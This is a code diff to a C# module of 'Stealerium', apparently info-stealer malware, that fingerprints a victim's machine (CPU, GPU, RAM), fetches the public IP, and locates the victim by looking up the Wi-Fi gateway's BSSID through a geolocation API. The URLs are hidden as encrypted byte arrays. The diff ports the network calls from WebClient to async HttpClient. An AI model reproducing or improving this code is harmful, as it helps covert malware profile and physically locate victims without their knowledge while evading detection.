@@ -5,9 +5,11 @@ using System.Globalization;
 using System.Linq;
 using System.Management;
 using System.Net;
+using System.Net.Http;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 using Microsoft.Win32;
 using Stealerium.Helpers;
@@ -72,7 +74,7 @@ namespace Stealerium.Target.System
                 {
                     foreach (var o in mSearcher.Get())
                     {
-                        var tObj = (ManagementObject) o;
+                        var tObj = (ManagementObject)o;
                         sData = Convert.ToString(tObj["Name"]);
                     }
 
@@ -181,19 +183,21 @@ namespace Stealerium.Target.System
         }
 
         // Get public IP
-        public static string GetPublicIp()
+        public static async Task<string> GetPublicIp()
         {
             try
             {
-                var externalip = new WebClient()
-                    .DownloadString(
-                        StringsCrypt.Decrypt(new byte[]
-                        {
-                            23, 61, 220, 157, 111, 249, 43, 180, 122, 28, 107, 102, 60, 187, 44, 39, 44, 238, 221, 5,
-                            238, 56, 3, 133, 224, 68, 195, 226, 41, 226, 22, 191
-                        })) // http://icanhazip.com
-                    .Replace("\n", "");
-                return externalip;
+                using (var client = new HttpClient())
+                {
+                    var url = StringsCrypt.Decrypt(new byte[]
+                    {
+                        23, 61, 220, 157, 111, 249, 43, 180, 122, 28, 107, 102, 60, 187, 44, 39, 44, 238, 221, 5,
+                        238, 56, 3, 133, 224, 68, 195, 226, 41, 226, 22, 191
+                    }); // http://icanhazip.com
+
+                    var externalip = await client.GetStringAsync(url);
+                    return externalip.Replace("\n", "");
+                }
             }
             catch (Exception ex)
             {
@@ -207,7 +211,7 @@ namespace Stealerium.Target.System
         private static string GetBssid()
         {
             var macAddr = new byte[6];
-            var macAddrLen = (uint) macAddr.Length;
+            var macAddrLen = (uint)macAddr.Length;
             try
             {
                 var ip = GetDefaultGateway();
@@ -215,7 +219,7 @@ namespace Stealerium.Target.System
                         ref macAddrLen) != 0)
                     return "unknown";
 
-                var v = new string[(int) macAddrLen];
+                var v = new string[(int)macAddrLen];
                 for (var j = 0; j < macAddrLen; j++)
                     v[j] = macAddr[j].ToString("x2");
                 return string.Join(":", v);
@@ -231,7 +235,7 @@ namespace Stealerium.Target.System
         // Get location by BSSID
         // Example API response:
         // {"result":200, "data":{"lat": 45.22172742372, "range": 156.997, "lon": 16.54707889397, "time": 1595238766}}
-        public static string GetLocation()
+        public static async Task<string> GetLocation()
         {
             string response;
             var bssid = GetBssid(); // "00:0C:42:1F:65:E9";
@@ -241,16 +245,16 @@ namespace Stealerium.Target.System
             // Get coordinates by bssid
             try
             {
-                using (var client = new WebClient())
+                using (var client = new HttpClient())
                 {
-                    response = client.DownloadString(
-                        StringsCrypt.Decrypt(new byte[]
-                        {
-                            239, 87, 16, 244, 130, 200, 219, 198, 121, 223, 110, 28, 218, 166, 27, 2, 253, 239, 236, 54,
-                            11, 159, 146, 91, 205, 36, 0, 49, 166, 93, 22, 23, 221, 210, 170, 52, 17, 123, 35, 113, 33,
-                            136, 114, 109, 224, 65, 139, 150, 160, 210, 179, 207, 197, 164, 182, 82, 86, 244, 231, 174,
-                            68, 222, 51, 47
-                        }) + bssid); // https://api.mylnikov.org/geolocation/wifi?v=1.1&bssid=
+                    var url = StringsCrypt.Decrypt(new byte[]
+                    {
+                        239, 87, 16, 244, 130, 200, 219, 198, 121, 223, 110, 28, 218, 166, 27, 2, 253, 239, 236, 54,
+                        11, 159, 146, 91, 205, 36, 0, 49, 166, 93, 22, 23, 221, 210, 170, 52, 17, 123, 35, 113, 33,
+                        136, 114, 109, 224, 65, 139, 150, 160, 210, 179, 207, 197, 164, 182, 82, 86, 244, 231, 174,
+                        68, 222, 51, 47
+                    }) + bssid; // https://api.mylnikov.org/geolocation/wifi?v=1.1&bssid=
+                    response = await client.GetStringAsync(url);
                 }
             }
             catch
@@ -283,7 +287,7 @@ namespace Stealerium.Target.System
             // https://www.google.com.ua/maps/place/
             if (lat != "Unknown" && lon != "Unknown")
                 result +=
-                    $"\n[Open google maps]({StringsCrypt.Decrypt(new byte[] {59, 129, 195, 34, 227, 242, 76, 173, 34, 247, 140, 112, 238, 245, 161, 60, 49, 127, 57, 59, 227, 89, 70, 152, 32, 242, 56, 102, 234, 75, 63, 18, 228, 223, 4, 147, 131, 146, 214, 158, 87, 69, 119, 232, 58, 195, 55, 105})}{lat} {lon})";
+                    $"\n[Open google maps]({StringsCrypt.Decrypt(new byte[] { 59, 129, 195, 34, 227, 242, 76, 173, 34, 247, 140, 112, 238, 245, 161, 60, 49, 127, 57, 59, 227, 89, 70, 152, 32, 242, 56, 102, 234, 75, 63, 18, 228, 223, 4, 147, 131, 146, 214, 158, 87, 69, 119, 232, 58, 195, 55, 105 })}{lat} {lon})";
 
             return result;
         }
@@ -296,7 +300,7 @@ namespace Stealerium.Target.System
                 var mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
                 foreach (var o in mSearcher.Get())
                 {
-                    var mObject = (ManagementObject) o;
+                    var mObject = (ManagementObject)o;
                     return mObject["Name"].ToString();
                 }
             }
@@ -316,7 +320,7 @@ namespace Stealerium.Target.System
                 var mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
                 foreach (var o in mSearcher.Get())
                 {
-                    var mObject = (ManagementObject) o;
+                    var mObject = (ManagementObject)o;
                     return mObject["Name"].ToString();
                 }
             }
@@ -338,9 +342,9 @@ namespace Stealerium.Target.System
                 {
                     foreach (var o in mos.Get())
                     {
-                        var mo = (ManagementObject) o;
+                        var mo = (ManagementObject)o;
                         var bytes = Convert.ToDouble(mo["TotalPhysicalMemory"]);
-                        ramAmount = (int) (bytes / 1048576);
+                        ramAmount = (int)(bytes / 1048576);
                         break;
                     }
                 }
